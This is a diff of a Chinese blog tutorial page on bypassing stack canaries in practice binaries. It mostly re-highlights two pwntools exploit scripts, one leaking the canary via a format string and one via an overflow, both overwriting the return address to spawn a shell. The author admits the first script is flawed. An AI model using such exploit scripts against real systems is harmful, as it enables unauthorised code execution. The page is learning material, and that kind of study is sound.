@@ -304,7 +304,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>下面分别给出两种情况的案例 来绕过Canary保护</p>
 <h3 id="配合格式化字符串绕过"><a href="#配合格式化字符串绕过" class="headerlink" title="配合格式化字符串绕过"></a>配合格式化字符串绕过</h3><p>首先给出案例代码</p>
 <pre class=" language-C"><code class="language-C">#include <stdio.h>
-#include<stdlib.h>
+#include <stdlib.h>
 
 void pwn()
 {
@@ -343,23 +343,23 @@ int main(void)
             </figure>
 
 <p>那下一步就是写脚本了</p>
-<pre class=" language-Python"><code class="language-Python">from pwn import *
-context.log_level='debug'
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
 
-sh=process("./canary")
-sys_addr=ELF("./canary").symbols['pwn']
-payload = "%31$p"
-sh.sendline(payload)
-sh.recvuntil("this is out\n")
-canary=sh.recvline()[0:-1]
-canary=int(canary,16)
-sh.sendline('0')
-payload2='a'*0x64+p32(canary)+p32(0)+p32(sys_addr)
-#这个脚本这里是有问题的 菜鸡实在不知道怎么把十进制数转成16进制数... 大致思路理解下即可...
-sh.sendline(payload2)
-sh.recvuntil("this is out\n")
-sh.sendline('1')
-sh.interactive()</code></pre>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
+sys_addr<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'pwn'</span><span class="token punctuation">]</span>
+payload <span class="token operator">=</span> <span class="token string">"%31$p"</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span>
+canary<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+canary<span class="token operator">=</span>int<span class="token punctuation">(</span>canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x64</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#这个脚本这里是有问题的 菜鸡实在不知道怎么把十进制数转成16进制数... 大致思路理解下即可...</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <h3 id="溢出覆盖绕过Canary保护"><a href="#溢出覆盖绕过Canary保护" class="headerlink" title="溢出覆盖绕过Canary保护"></a>溢出覆盖绕过Canary保护</h3><p>先给出样例</p>
 <pre class=" language-C"><code class="language-C">#include <stdio.h>
 #include<stdlib.h>
@@ -385,27 +385,27 @@ int main(void)
 }</stdlib.h></stdio.h></code></pre>
 <p>这个就没有那么多将就 直接载入IDA 看距离 覆盖到Canary值即可</p>
 <p>脚本如下</p>
-<pre class=" language-Python"><code class="language-Python">#coding:utf-8
-from pwn import *
-context.log_level = 'debug'
-context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
-r = process("./canary1")
-shell_addr = ELF("./canary1").sym["pwn"]
-payload = "a"*100
-r.sendline(payload)
-r.recvuntil("this is out")
-r.recvuntil("a"*100)
-canary = u32(r.recv(4))-0x0a
-log.info("canary:"+hex(canary))
-r.sendline('0')
-payload =  "a"*100 #填充
-payload += p32(canary)#泄露的canary
-payload += "a"*8
-payload += "aaaa" #ebp
-payload += p32(shell_addr) # ret addr
-r.sendline(payload)
-r.sendline('1')
-r.interactive()</code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span> <span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./canary1"</span><span class="token punctuation">)</span>
+shell_addr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./canary1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"pwn"</span><span class="token punctuation">]</span>
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out"</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
+canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span>  <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span> <span class="token comment" spellcheck="true">#填充</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露的canary</span>
+payload <span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span>
+payload <span class="token operator">+=</span> <span class="token string">"aaaa"</span> <span class="token comment" spellcheck="true">#ebp</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret addr</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -431,7 +431,7 @@ r.interactive()</code></pre>
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-18T12:12:23.665Z" itemprop="dateUpdated">2019-10-18 20:12:23</time>
+    最后更新时间：<time datetime="2019-10-18T12:20:53.903Z" itemprop="dateUpdated">2019-10-18 20:20:53</time>
 </span><br>
 
 
